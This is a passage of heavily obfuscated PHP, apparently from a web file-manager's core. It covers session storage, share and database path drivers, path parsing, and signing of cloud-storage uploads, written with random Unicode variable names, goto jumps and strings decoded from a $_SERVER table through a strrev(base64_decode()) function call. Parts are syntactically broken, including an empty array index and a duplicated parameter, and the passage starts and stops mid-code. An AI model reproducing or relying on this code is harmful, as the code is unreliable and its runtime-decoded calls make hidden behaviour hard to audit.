header($_SERVER[$c¶[1449]] . $c¶[1450]); echo $c¶[1451]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$eâ[1443]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto Bז; Cخُ: $eâ =& $_SERVER[Ť]; $D = parse_url($_SERVER[$eâ[1443]], PHP_URL_PATH); $dٌ = $_SERVER[$eâ[154]]; goto AҴﻶ; Bז: } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto B߆򯏂; B߆򯏂: $E佥 =& $_SERVER[Ť]; static $C̹ȣǚ = false; if ($C̹ȣǚ) { return $C̹ȣǚ; } goto C̿; Fᬉ: if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $C̹ȣǚ = new self(); return $C̹ȣǚ; goto fؑ; C̿: $bѐ = $GLOBALS[$E佥[6]][$E佥[343]]; self::$sessionTime = $bѐ[$E佥[1452]]; $a = isset($GLOBALS[$E佥[1453]]) ? $GLOBALS[$E佥[1453]] : SESSION_ID; goto dߛܿ; A΅: $fذ = $bѐ[$a܅䂪]; $b謪 = $bѐ[$E佥[771]]; switch ($a܅䂪) { case $E佥[17]: self::$handle = Model($E佥[772]); break; case $E佥[773]: self::$handle = new CacheRedis($fذ, $b謪); break; case $E佥[774]: self::$handle = new CacheMemcached($fذ, $b謪); break; case $E佥[171]: $fذ[$E佥[75]] = $fذ[$E佥[75]] . $E佥[1455]; self::$handle = new CacheFile($fذ, $b謪); default: break; } goto Fᬉ; dߛܿ: if (self::$sessionSign) { } else { if (Cookie::get($a)) { self::$sessionSign = Cookie::get($a); } else { self::$sessionSign = guid(); } } Cookie::setSafe($a, self::$sessionSign, self::$sessionTime); $a܅䂪 = $bѐ[$E佥[1454]]; goto A΅; fؑ: } public static function sign($dŞ = false) { $dŞ && (self::$sessionSign = $dŞ); self::init(); return self::$sessionSign; } public static function set($Dނ, $e˯贐 = false) { self::init(); if (is_array($Dނ)) { foreach ($Dނ as $e => $bɊ) { array_set_value(self::$data, $e, $bɊ); } } else { array_set_value(self::$data, $Dނ, $e˯贐); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($f = false) { self::init(); if (!$f) { return self::$data; } return array_get_value(self::$data, $f); } public static function remove($AӔ) { self::init(); unset(self::$data[$AӔ]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[Ť][776])) { self::$handle->clearTimeout(); } } } goto aƲ; d邨: class PathDriverDbShareItem extends PathDriverDB { public function __construct($e顃ӛ) { $this->pathParse = $e顃ӛ; $this->model = Model($_SERVER[Ť][1172]); } public function getPathOuter($c) { $A =& $_SERVER[Ť]; if (!$c) { return $c; } $f = $this->parse($c); return trim(KodIO::makeShare($this->pathParse[$A[383]], $f[$A[383]]), $A[8]); } protected function infoParse($b¨, $cՌě = false, $EϮ = false) { $eч =& $_SERVER[Ť]; $F؏ = $this->pathParse[$eч[383]]; $D = trim($this->pathParse[$eч[1034]], $eч[8]); return Action($eч[1179])->sharePathInfo($F؏, $D); } public function infoFull($C٘) { $c =& $_SERVER[Ť]; $C厳 = explode($c[8], trim($C٘, $c[8])); if (count($C厳) > 1) { $f띿 = implode($c[8], array_splice($C厳, 1)); $Bӧ = $this->model->pathInfoByPath($C厳[0], $f띿); if (!$Bӧ) { return !1; } $this->pathParse[$c[1034]] = $Bӧ[$c[385]]; } return $this->infoParse($C٘); } public function listAll($c份ǵ) { goto EƎ; a锑: $f삚 = $this->model->listAll($c份ǵ); $eğ = Model($bħ[552])->getInfo($f[$bħ[456]]); $D = Action($bħ[1179]); goto A¥ö; EƎ: $bħ =& $_SERVER[Ť]; $f = IO::info($this->pathParse[$bħ[75]]); if (!$f) { return array(); } goto a锑; A¥ö: foreach ($f삚 as &$F󺨍) { check_abort(); $F󺨍[$bħ[407]] = $D->_shareItemeParse($F󺨍[$bħ[407]], $eğ); } unset($F󺨍); return $f삚; goto fֆȽ˱; fֆȽ˱: } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($aɺ) { $this->pathParse = $aɺ; $this->model = Model($_SERVER[Ť][1172]); } protected function infoParse($eц, $Fɘ = false, $Eԅ = false) { $a =& $_SERVER[Ť]; return Action($a[1040])->sharePathInfo($this->pathParse[$a[75]], !0); } public function listPath($fѵ쒖, $a񷔾 = false) { $dҡةǶ =& $_SERVER[Ť]; $FƑ = parent::listPath($fѵ쒖, $a񷔾); foreach ($FƑ as $f̝γ => $DΖ) { if (!in_array($f̝γ, array($dҡةǶ[73], $dҡةǶ[74]))) { continue; } foreach ($DΖ as $C => $e琫) { $FƑ[$f̝γ][$C] = Action($dҡةǶ[1040])->shareItemInfo($e琫); } } return $FƑ; } public function listAll($Fȱ͞) { goto Eΐ; Eΐ: $bģЅ =& $_SERVER[Ť]; $a = IO::info($this->pathParse[$bģЅ[75]]); if (!$a) { return array(); } goto B߅; B߅: $Eه = $this->model->listAll($Fȱ͞); foreach ($Eه as &$BǴ) { $BǴ[$bģЅ[407]] = Action($bģЅ[1040])->shareItemInfo($BǴ[$bģЅ[407]]); } unset($BǴ); goto eΗ; eΗ: return $Eه; goto F됅; F됅: } } class PathDriverDriverShareItem { public function __construct($B֏) { $this->pathParse = $B֏; } public function __call($bѫû, $D) { $B =& $_SERVER[Ť]; if (method_exists($this, $bѫû)) { return; } $d = call_user_func_array(array($B[1180], $bѫû), $D); $e = array($B[1181], $B[1182], $B[1183], $B[1184], $B[507], $B[509], $B[1185], $B[103], $B[1186], $B[1187]); if (in_array($bѫû, $e)) { $d = $this->getPathOuter($d); } return $d; } public function copy($fŚ, $cۤ, $A = false) { return $this->copyMove($fŚ, $cۤ, $A, $_SERVER[Ť][507]); } public function move($c蓇, $Dˉ׆, $a = false) { return $this->copyMove($c蓇, $Dˉ׆, $a, $_SERVER[Ť][509]); } private function copyMove($d⪨, $B, $Cڊ, $aܺΙ) { goto B􎙌; d݅: return $e٩֚; goto Eד; a: if ($c->pathParse[$A֮[1018]]) { $B = $c->pathParse[$A֮[1018]]; } else { $B = $C⭥; } $e٩֚ = IO::copyMove($d⪨, $B, $Cڊ, $aܺΙ); $e٩֚ = $this->getPathOuter($e٩֚); goto d݅; B􎙌: $A֮ =& $_SERVER[Ť]; $C⭥ = $B; $c = IO::driverMake($B); goto a; Eד: } public function pathThis($F䟣) { return get_path_this($this->pathParse[$_SERVER[Ť][75]]); } public function pathFather($FШ) { return get_path_father($this->pathParse[$_SERVER[Ť][75]]); } public function iconvSystem($f) { return $f; } protected function infoParse($A⇣, $bÐ« = false) { $a飱 =& $_SERVER[Ť]; $F鿔 = $this->pathParse[$a飱[454]][$a飱[1041]] . $this->pathParse[$a飱[1034]]; if ($bÐ«) { $E = IO::infoWithChildren($F鿔); } else { $E = IO::info($F鿔); } $aӔݷ = $this->pathParse[$a飱[454]]; return Action($a飱[1179])->_shareItemeParse($E, $aӔݷ); } public function listAll($aܽ) { $e =& $_SERVER[Ť]; $F = IO::listAll($aܽ); $d囗 = $this->pathParse[$e[454]]; foreach ($F as &$dۣ) { check_abort(); $dۣ = array_merge(IO::info($dۣ[$e[75]]), $dۣ); $dۣ[$e[407]] = Action($e[1179])->_shareItemeParse($dۣ, $d囗); } unset($dۣ); return $F; } public function getPathOuter($DŇ) { goto Eꆴ; B̈ʱ: $D읕 = KodIO::clear($DŇ); $A񍃥 = KodIO::clear($this->pathParse[$d[454]][$d[1041]]); $aź׵ = substr($D읕, strlen($A񍃥)); goto A䍧φ; A䍧φ: if (substr($D읕, 0, strlen($A񍃥)) != $A񍃥) { return !1; } return $this->pathParse[$d[1035]] . $d[8] . ltrim($aź׵, $d[8]); goto C̾; Eꆴ: $d =& $_SERVER[Ť]; $aΓ = KodIO::parse($DŇ); if ($aΓ[$d[29]] == KodIO::KOD_SHARE_ITEM) { return $aΓ[$d[75]]; } goto B̈ʱ; C̾: } public function getType() { $Fƃ =& $_SERVER[Ť]; $B٭ = str_replace($Fƃ[71], $Fƃ[33], get_class($this)); return strtolower($B٭); } public function isTypeObject($Aޫ۶) { return IO::isTypeObject($Aޫ۶); } public function info($b܊) { return $this->infoParse($b܊); } public function infoAuth($B) { return $this->infoParse($B); } public function infoWithChildren($d鵸) { return $this->infoParse($d鵸, !0); } public function infoFull($aǨ) { return $this->infoParse($aǨ); } } goto Aۊ; aǓ: $Fح͚ = strrev(base64_decode($_SERVER[][0])); function binCheckNeq($A, $fݤʃ) { return $A != $fݤʃ; } $_SERVER[$_SERVER[][1]] = $Fح͚($_SERVER[$_SERVER[][2]]); goto c͚̔; C: class KodIO { const KOD_SOURCE = "\173\163\x6f\x75\x72\x63\145\175"; const KOD_USER_RECYCLE = "\x7b\x75\163\x65\x72\122\145\143\171\x63\154\x65\175"; const KOD_USER_FAV = "\x7b\x75\163\145\x72\x46\141\x76\175"; const KOD_USER_FILE_TAG = "\x7b\x75\x73\x65\x72\x46\151\154\x65\124\x61\x67\x7d"; const KOD_USER_FILE_TYPE = "\173\165\x73\x65\x72\x46\151\154\145\x54\x79\x70\145\x7d"; const KOD_GROUP_ROOT_SELF = "\173\x67\x72\x6f\165\160\x52\157\x6f\164\x53\145\154\x66\175"; const KOD_USER_SHARE = "\x7b\x75\x73\145\x72\x53\150\141\x72\x65\175"; const KOD_USER_SHARE_LINK = "\x7b\165\163\x65\162\x53\150\141\x72\145\x4c\x69\156\153\175"; const KOD_USER_SHARE_TO_ME = "\x7b\x73\x68\141\162\x65\124\x6f\115\145\x7d"; const KOD_SHARE_ITEM = "\x7b\x73\150\x61\162\145\x49\164\x65\155\175"; const KOD_SHARE_LINK = "\173\163\x68\x61\162\x65\x49\164\x65\x6d\x4c\x69\156\153\x7d"; const KOD_SEARCH = "\173\163\x65\x61\162\x63\x68\175"; const KOD_BLOCK = "\173\142\154\157\143\x6b\x7d"; const KOD_IO = "\x7b\x69\x6f\x7d"; const KOD_USER_RECENT = "\x7b\165\x73\x65\x72\122\145\156\x63\145\156\x74\x7d"; const KOD_USER_DRIVER = "\x7b\x64\x72\151\166\x65\x72\x7d"; public static function typeList() { $d =& $_SERVER[Ť]; return array($d[1107] => self::KOD_SOURCE, $d[1108] => self::KOD_USER_RECYCLE, $d[1109] => self::KOD_USER_FAV, $d[1110] => self::KOD_USER_FILE_TAG, $d[1111] => self::KOD_USER_FILE_TYPE, $d[1112] => self::KOD_GROUP_ROOT_SELF, $d[1113] => self::KOD_USER_SHARE, $d[1114] => self::KOD_USER_SHARE_LINK, $d[1115] => self::KOD_USER_SHARE_TO_ME, $d[1116] => self::KOD_SHARE_ITEM, $d[1117] => self::KOD_SHARE_LINK, $d[1118] => self::KOD_SEARCH, $d[1119] => self::KOD_BLOCK, $d[1120] => self::KOD_IO, $d[1121] => self::KOD_USER_RECENT, $d[1122] => self::KOD_USER_DRIVER); } public static function parse($dƯ) { goto D; eآ҆: preg_match($F[1123], $dƯ, $Dך); $b݌ = array($F[404] => !1, $F[1124] => !1, $F[401] => !1, $F[75] => $dƯ, $F[1035] => !1, $F[1034] => $F[33]); if (is_array($Dך) && count($Dך) == 5) { $Fېш = $F[1125] . $Dך[2] . $F[321]; if (in_array($Fېш, $AȖŤ)) { $b݌[$F[1035]] = $Dך[1]; $b݌[$F[29]] = $Fېш; $b݌[$F[1126]] = substr($Fېш, 1, -1); $b݌[$F[383]] = $Dך[3]; } $b݌[$F[1034]] = $Dך[4]; } goto Eަ掑; D: $F =& $_SERVER[Ť]; $dƯ = self::clear($dƯ); $AȖŤ = array_values(self::typeList()); goto eآ҆; Eަ掑: $fًϪ = array($F[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $b݌[$F[1088]] = in_array($b݌[$F[29]], $fًϪ); return $b݌; goto bɴ; bɴ: } public static function clear($e) { goto cĻ; cĻ: $f͎ =& $_SERVER[Ť]; $e = str_replace(array($f͎[1008], $f͎[225]), $f͎[50], $e); $e = str_replace($f͎[93], $f͎[8], $e); goto CԴ; CԴ: $E = $f͎[1127]; if (substr($e, 0, 3) == $f͎[1128]) { $e = substr($e, 3); } while (strstr($e, $E)) { $e = str_replace($E, $f͎[8], $e); } goto c׎; c׎: $e = preg_replace($f͎[1129], $f͎[8], $e); if ($e == $f͎[8]) { return $f͎[8]; } $e = rtrim($e, $f͎[8]); goto Aߌ; Aߌ: return $e; goto Fʴ; Fʴ: } public static function sourceID($eی) { $Cݍҏ =& $_SERVER[Ť]; $A顆 = self::parse($eی); if ($A顆[$Cݍҏ[29]] !== self::KOD_SOURCE) { show_json(LNG($Cݍҏ[1130]), !1); } return $A顆[$Cݍҏ[383]]; } public static function make($dꎼ) { if (!$dꎼ) { return !1; } return self::makePath(self::KOD_SOURCE, intval($dꎼ)); } public static function makeShare($aϜ, $EɈؙ) { return self::makePath(self::KOD_SHARE_ITEM, $aϜ, $EɈؙ); } public static function makeFileTypePath($A窌) { return self::makePath(self::KOD_USER_FILE_TYPE, $A窌); } public static function makeFileTagPath($Bͮн) { return self::makePath(self::KOD_USER_FILE_TAG, $Bͮн); } public static function makePath($d낺, $Fޢ = '', $dُ = '') { $EČƠԿ =& $_SERVER[Ť]; $B = substr($d낺, 1, -1); $D = $EČƠԿ[1131] . $B . $EČƠԿ[1132] . $Fޢ . $EČƠԿ[1133]; $D = $dُ ? $D . $dُ . $EČƠԿ[8] : $D; return $D; } public static function hashPath($F) { $e휭 =& $_SERVER[Ť]; $FҔц = is_array($F) ? $F : IO::info($F); $aŠ = _get($FҔц, $e휭[1134], $e휭[33]); if (!$aŠ) { $fΰ = KodIO::parse($FҔц[$e휭[75]]); if (!$fΰ[$e휭[29]]) { $aŠ = IO::hashSimple($FҔц[$e휭[75]]); } } if (!$aŠ) { $aŠ = md5($FҔц[$e휭[75]] . $FҔц[$e휭[77]] . $FҔц[$e휭[107]]); } return $aŠ; } public static function initSystemPath() { goto C; D: IOHistory::bindEvent(); goto AԾ犽; C: $F艳 =& $_SERVER[Ť]; if (defined($F艳[1135])) { return; } define($F艳[1135], self::systemPath($F艳[1136])); goto c; c: define($F艳[1137], self::systemPath($F艳[1138])); define($F艳[1139], self::systemPath($F艳[1140])); define($F艳[1141], self::systemPath($F艳[1142])); goto D; AԾ犽: } public static function systemPath($eی) { goto C; C: $c׿鿫 =& $_SERVER[Ť]; $DՉҭ = $c׿鿫[1143] . ucfirst($eی); $Fˡ = Model($c׿鿫[1093])->get($DՉҭ); goto EՈ; dر̏: return $Fˡ; goto Cǭ; EՈ: if ($Fˡ) { return $Fˡ; } if ($eی == $c׿鿫[1136]) { $Fˡ = self::make(Model($c׿鿫[768])->systemRootPathAdd($c׿鿫[1144])); } else { $Fˡ = self::systemPath($c׿鿫[1136]); $FƵԟ = self::sourceID($Fˡ); $Fˡ = self::make(Model($c׿鿫[768])->mkdir($FƵԟ, $eی)); } Model($c׿鿫[1093])->set($DՉҭ, $Fˡ); goto dر̏; Cǭ: } public static function systemFolder($D) { $bĆڒ = IO_PATH_SYSTEM_SOURCE . $D; $Fӂ = Cache::get($bĆڒ); if (!$Fӂ) { $dؽ̧ = IO::infoFull($bĆڒ); if (!$dؽ̧) { $Fӂ = IO::mkdir($bĆڒ, REPEAT_SKIP); } else { $Fӂ = $dؽ̧[$_SERVER[Ť][75]]; } Cache::set($bĆڒ, $Fӂ, 3600 * 10); } return $Fӂ; } public static function defaultDriver() { return Model($_SERVER[Ť][713])->defaultDriver(); } public static function defaultIO() { $f朗 =& $_SERVER[Ť]; $b = self::defaultDriver(); return $f朗[1145] . $b[$f朗[383]] . $f朗[1133]; } public static function defaultDriverInit() { static $e = false; if ($e) { return $e; } $e = IO::init(self::defaultIO()); return $e; } public static function fileTypeList() { $b؍ =& $_SERVER[Ť]; $fոد = $GLOBALS[$b؍[6]][$b؍[1146]]; foreach ($fոد as $C̍ => $B讵) { $e = $b؍[1147] . $C̍; $a҆ݤ = LNG($e); if ($e != $a҆ݤ) { $fոد[$C̍][$b؍[28]] = $a҆ݤ; } } return $fոد; } public static function transferType($fՕ, $BՍ͎) { goto b˕; fŝԊ: if ($A[$Eč[29]] == $F[$Eč[29]] && $A[$Eč[1148]] == $F[$Eč[1148]]) { return $Eč[1149]; } if ($A[$Eč[29]] == $Eč[801] && $F[$Eč[29]] == $Eč[102]) { return $Eč[1064]; } if ($A[$Eč[29]] == $Eč[102] && $F[$Eč[29]] == $Eč[801]) { return $Eč[103]; } goto d; b˕: $Eč =& $_SERVER[Ť]; $A = self::driverType($fՕ); $F = self::driverType($BՍ͎); goto fŝԊ; d: return $Eč[1150]; goto f㉦; f㉦: } public static function driverType($cȳ) { goto B; B: $bٗ =& $_SERVER[Ť]; $A۝ = $cȳ->path; $d⤊ = str_replace($bٗ[1151], $bٗ[33], strtolower($cȳ->getType())); goto FԂ; FԂ: if ($d⤊ == $bٗ[704] || $d⤊ == $bٗ[1152] || $d⤊ == $bٗ[1153]) { $cȳ = self::defaultDriverInit(); } else { if ($d⤊ == $bٗ[1071] || $d⤊ == $bٗ[1154]) { $cȳ = IO::init($cȳ->pathParse[$bٗ[1018]]); } } $d⤊ = str_replace($bٗ[1151], $bٗ[33], strtolower($cȳ->getType())); if ($d⤊ == $bٗ[102]) { return array($bٗ[29] => $bٗ[102], $bٗ[1148] => $bٗ[33], $bٗ[75] => $A۝); } goto F; F: return array($bٗ[29] => $bٗ[801], $bٗ[1148] => $cȳ->pathDriver, $bٗ[75] => $A۝); goto Eɓ; Eɓ: } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($Bě) { parent::__construct($Bě); $this->signatureVersion($_SERVER[Ť][208]); } public function uploadFormData($d, $Cٕۇ = 3600) { goto bԤ; bԤ: $E٠ =& $_SERVER[Ť]; $bҕ = $E٠[189]; $Eօ = $E٠[226]; goto eƗ; eƗ: $b߮Ո = $E٠[1155]; $E = gmdate($E٠[1156], time() + $Cٕۇ); $a = (string) time() . $E٠[67] . (string) (time() + $Cٕۇ); goto cы⭛; d: return $BԿՔ; goto F눬; cы⭛: $c = array($E٠[1157] => $E, $E٠[1158] => array(array($E٠[1159] => $bҕ), array($E٠[1160] => $this->bucket), array($E٠[1161], $E٠[1162], $E٠[33]), array($E٠[1163] => $b߮Ո), array($E٠[1164] => $Eօ), array($E٠[1165] => $this->accessKey), array($E٠[1166] => $a))); $c = json_encode($c); $e = hash_hmac($E٠[226], $a, $this->secret); goto DГ; DГ: $E = sha1($c); $C = hash_hmac($E٠[226], $E, $e); $BԿՔ = array($E٠[1159] => $bҕ, $E٠[1163] => $b߮Ո, $E٠[1167] => base64_encode($c), $E٠[1164] => $Eօ, $E٠[1165] => $this->accessKey, $E٠[1168] => $a, $E٠[1169] => $C, $E٠[173] => $this->getHost()); goto d; F눬: } public function fileOutLink($AɌŘ) { $Bձݯ =& $_SERVER[Ť]; if (substr($AɌŘ, 0, 7) == $Bձݯ[1170]) { $AɌŘ = $Bձݯ[1171] . substr($AɌŘ, 7); } header($Bձݯ[156] . $AɌŘ); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($Cϥ) { $this->pathParse = $Cϥ; $this->model = Model($_SERVER[Ť][1172]); } public function getPath($Cő) { return trim($Cő, $_SERVER[Ť][8]); } public function pathFather($aߪ) { $DŌ = $this->parse($aߪ); $DŌ = $this->infoSimple($aߪ); return $DŌ ? $DŌ[$_SERVER[Ť][478]] : !1; } public function pathThis($bؒѢ) { $DՇ = $this->infoSimple($bؒѢ); return $DՇ ? $DՇ[$_SERVER[Ť][28]] : !1; } public function getPathOuter($ė) { if (!$ė) { return $ė; } $E떆 = $this->parse($ė); return KodIO::make($E떆[$_SERVER[Ť][383]]); } public function copyFolderFromIO($aί, $BÅ, $Dͻ, $Aǐђ, $EÔ) { $e׍ = $this->model->copyFolderFromIO($aί, $BÅ, $Dͻ, $Aǐђ, $EÔ); return KodIO::make($e׍); } public function isParentOf($Cӗ, $D) { return $this->model->isParentOf($Cӗ, $D); } public function mkfile($CȾ, $fǏ = '', $eɏ = REPEAT_RENAME) { $F =& $_SERVER[Ť]; $bα = $this->parse($CȾ); $CȾ = $bα[$F[383]]; for ($C᳹ = 0; $C᳹ < count($bα[$F[1173]]); $C᳹++) { $eٹ = $bα[$F[1173]][$C᳹]; if ($C᳹ == count($bα[$F[1173]]) - 1) { $CȾ = $this->model->mkfile($CȾ, $eٹ, $fǏ, $eɏ); break; } $CȾ = $this->model->mkdir($CȾ, $eٹ, REPEAT_SKIP); } return $this->getPathOuter($CȾ); } public function mkdir($c튌, $FҪ = REPEAT_SKIP) { $C =& $_SERVER[Ť]; $D֫ = $this->parse($c튌); $c튌 = $D֫[$C[383]]; for ($bփ = 0; $bփ < count($D֫[$C[1173]]); $bփ++) { $A졲µ = $D֫[$C[1173]][$bփ]; $c튌 = $this->model->mkdir($c튌, $A졲µ, $FҪ); } return $this->getPathOuter($c튌); } public function copyFile($Cèړ, $C, $b = REPEAT_REPLACE) { $Eу =& $_SERVER[Ť]; $b = $this->parse($C); $b⻿ó = $this->model->copy($Cèړ, $b[$Eу[383]], $b, $b[$Eу[75]]); return $b⻿ó ? $this->getPathOuter($b⻿ó) : !1; } public function moveFile($dС͡, $d貕, $Dڝ = REPEAT_REPLACE) { $B桉Ҋ =& $_SERVER[Ť]; $F۩ = $this->parse($d貕); $bʟ麐 = $this->model->move($dС͡, $F۩[$B桉Ҋ[383]], $Dڝ, $F۩[$B桉Ҋ[75]]); return $bʟ麐 ? $this->getPathOuter($bʟ麐) : !1; } public function copy($cǺ, $eĴ, $bەƋ = REPEAT_REPLACE) { $fߙ = $this->parse($eĴ); $Eڄ = $this->model->copy($cǺ, $fߙ[$_SERVER[Ť][383]], $bەƋ); return $Eڄ ? $this->getPathOuter($Eڄ) : !1; } public function moveSameAllow() { } public function move($B, $a, $f = REPEAT_REPLACE) { $bÕϨ = $this->parse($a); $C = $this->model->move($B, $bÕϨ[$_SERVER[Ť][383]], $f); return $C ? $this->getPathOuter($C) : !1; } public function remove($aݮ, $f׃ʂ = true) { return $this->model->remove($aݮ, $f׃ʂ); } public function rename($aچ, $fɱ) { $Cۊ = $this->model->rename($aچ, $fɱ); return $Cۊ ? $this->getPathOuter($aچ) : $Cۊ; } public function size($b٭) { $F򅎇 = $this->infoSimple($b٭); return $F򅎇 ? $F򅎇[$_SERVER[Ť][77]] : 0; } public function infoSimple($c֙Լ) { return $this->model->sourceInfo($c֙Լ); } public function info($e߿ɟ) { return $this->infoParse($e߿ɟ); } public function infoAuth($D) { return $this->infoParse($D, !1, !0); } public function infoWithChildren($d) { return $this->infoParse($d, !0); } protected function infoParse($D, $dґ = false, $Cګ = false) { if (!$dґ) { return $this->model->pathInfo($D, $Cګ); } return $this->model->pathInfoMore($D); } public function infoFull($e͘) { $a =& $_SERVER[Ť]; $bɥ = explode($a[8], $e͘); $bЎ׏ = implode($a[8], array_splice($bɥ, 1)); return $this->model->pathInfoByPath($bɥ[0], $bЎ׏); } public function hashSimple($e) { $DՋ =& $_SERVER[Ť]; $DЙʨ = $this->infoWithChildren($e); return $DЙʨ[$DՋ[161]][$DՋ[168]]; } public function hashMd5($Aٴ) { $D =& $_SERVER[Ť]; $b = $this->infoWithChildren($Aٴ); return $b[$D[161]][$D[167]]; } public function exist($D) { $dᦌ =& $_SERVER[Ť]; $C = $this->parse($D); if (!$C[$dᦌ[75]]) { return $this->isFile($D) || $this->isFolder($D); } $bđ = array($dᦌ[384] => $C[$dᦌ[383]], $dᦌ[28] => $C[$dᦌ[75]]); $F = $this->model->where($bđ)->find(); return $F ? !0 : !1; } public function isFile($d㿨) { $Dܯ =& $_SERVER[Ť]; $bɃ = $this->infoSimple($d㿨); return $bɃ && $bɃ[$Dܯ[386]] == $Dܯ[83] ? !1 : !0; } public function isFolder($FɊϰ) { $Aι =& $_SERVER[Ť]; $c = $this->infoSimple($FɊϰ); return $c && $c[$Aι[386]] == $Aι[83] ? !0 : !1; } public function listPath($E߬, $E߬ӏ = false) { $d =& $_SERVER[Ť]; if ($E߬ == $d[33]) { return !1; } $Fމ = array($d[384] => $E߬); if ($E߬ӏ) { return $this->model->listSource($Fމ, -1); } return $this->model->listSource($Fމ); } public function has($d, $e暮 = false, $A頸 = null) { $F禟 =& $_SERVER[Ť]; $F = $this->infoWithChildren($d); if ($e暮) { return array($F禟[200] => $F[$F禟[200]], $F禟[199] => $F[$F禟[199]]); } return $A頸 ? $F[$F禟[200]] : $F[$F禟[199]]; } public function listAll($cˍ) { $A = IO::info($this->pathParse[$_SERVER[Ť][75]]); if (!$A) { return array(); } return $this->model->listAll($cˍ); } public function getContent($AڟѮ) { return $this->model->getContent($AڟѮ); } public function setContent($E, $C쥅 = '') { return $this->model->setContent($E, $C쥅); } public function fileSubstr($dɌ, $Aǔ, $fՈ) { return $this->model->fileSubstr($dɌ, $Aǔ, $fՈ); } public function download($f䯎, $bȔֆ = '') { $fƑ = get_path_father($bȔֆ); $C⭊ = get_path_this($bȔֆ); $C춆 = $this->model->fileInfoGet($f䯎); $b鄺 = IO::copy($C춆[$_SERVER[Ť][75]], $fƑ, !1, $C⭊); return $b鄺; } public function setModifyTime($Dފ, $cꄓʊ = '') { $this->model->metaSet($Dފ, $_SERVER[Ť][1174], $cꄓʊ); } public function upload($BԽ, $E, $a = false, $c֦Ԓ = REPEAT_REPLACE) { $dħ֍ =& $_SERVER[Ť]; $Aţ˚ = $this->parse($BԽ); $Dܟ = $this->model->addFile($Aţ˚[$dħ֍[383]], $E, $Aţ˚[$dħ֍[75]], $a, $c֦Ԓ); return $this->getPathOuter($Dܟ); } public function uploadFileByID($Fƿ, $aɱ, $fᜰ) { $A֗ =& $_SERVER[Ť]; $F֨ = $this->parse($Fƿ); $Eǃٛ = $this->model->addFileByFileID($F֨[$A֗[383]], $aɱ, $F֨[$A֗[75]], $fᜰ); return $this->getPathOuter($Eǃٛ); } public function addFileByRemote($fڒ, $DΈٿ, $Fמ = array(), $c = '', $c) { $d˹ს =& $_SERVER[Ť]; $CְԽ = $this->parse($fڒ); $c = empty($c) ? $CְԽ[$d˹ს[75]] : $c; $F嫒 = $this->model->addFileByRemote($CְԽ[$d˹ს[383]], $DΈٿ, $c, $Fמ, $c); return $this->getPathOuter($F嫒); } public function uploadLink($Bײ, $Fȩ = 0) { $EМެ =& $_SERVER[Ť]; $eᏰ = $this->parse($Bײ); $Bײ = Model($EМެ[560])->createFileName($eᏰ[$EМެ[75]]); $FĤ = IO::uploadLink($Bײ, $Fȩ); return $FĤ; } public function fileNameAuto($Dщ, $bʄ, $f喧 = REPEAT_REPLACE, $e = false) { return $this->model->fileNameAuto($Dщ, $bʄ, $f喧, $e); } public function fileNameExist($E, $c) { return $this->model->fileNameExist($E, $c); } protected function _fileOut($A, $Cʎ = false, $D = false, $C = '', $e⢸ = false) { goto dὄ; B늒҇: if ($e⢸) { return IO::fileOutServer($C鵎[$B򛃒[75]], $Cʎ, $aޝȱ, $C); } IO::fileOut($C鵎[$B򛃒[75]], $Cʎ, $aޝȱ, $C); goto B; dὄ: $B򛃒 =& $_SERVER[Ť]; $dٱˈ = $this->model->sourceInfo($A); if ($dٱˈ[$B򛃒[386]] == $B򛃒[83]) { header($B򛃒[1175]); die; } goto fԠއ; fԠއ: $C鵎 = $this->model->fileInfoGet($A); $C = $C鵎[$B򛃒[167]] ? $C鵎[$B򛃒[167]] : $C; $aޝȱ = isset($GLOBALS[$B򛃒[1176]]) ? $GLOBALS[$B򛃒[1176]] : $dٱˈ[$B򛃒[28]]; goto B늒҇; B: } public function fileOut($a, $FѦٟ = false, $a؈ʈ = false, $D = '') { $this->_fileOut($a, $FѦٟ, $a؈ʈ, $D); } public function fileOutServer($Dꙫ, $d = false, $c = false, $C = '') { $this->_fileOut($Dꙫ, $d, $c, $C, !0); } protected function _fileOutImage($f, $a𤝾 = 250) { goto a; a: $bԌЬ =& $_SERVER[Ť]; $B嚊 = $this->model->pathInfo($f); if ($B嚊[$bԌЬ[386]] == $bԌЬ[83]) { show_json($bԌЬ[1177] . $f, !1); } goto f; f: $A = $this->model->fileInfoGet($f); $A[$bԌЬ[28]] = $B嚊[$bԌЬ[28]]; $A[$bԌЬ[160]] = $B嚊[$bԌЬ[160]]; goto cĸ; cĸ: $GLOBALS[$bԌЬ[1176]] = $A[$bԌЬ[28]]; $GLOBALS[$bԌЬ[159]] = $A; IO::fileOutImage($A[$bԌЬ[75]], $a𤝾); goto eڈ; eڈ: } public function fileOutImage($F, $F© = 250) { $this->_fileOutImage($F, $F©); } public function fileOutImageServer($D߰ڔ, $Cΐ = 250) { $this->_fileOutImage($D߰ڔ, $Cΐ); } public function link($CЈ, $fԮ = '') { $d = $this->model->fileInfoGet($CЈ); return IO::link($d[$_SERVER[Ť][75]], $fԮ); } protected function parse($bҎɒ) { $B =& $_SERVER[Ť]; if (strstr($bҎɒ, $B[8]) === !1) { return array($B[401] => intval($bҎɒ), $B[75] => $B[33], $B[1173] => array()); } $Cñ = explode($B[8], trim($bҎɒ, $B[8])); if (count($Cñ) < 2) { show_tips($bҎɒ . $B[1178]); } return array($B[401] => intval($Cñ[0]), $B[75] => $Cñ[1], $B[1173] => array_slice($Cñ, 1)); } } goto d邨; B: class SystemRoleModel extends ModelBaseLight { public $optionType = 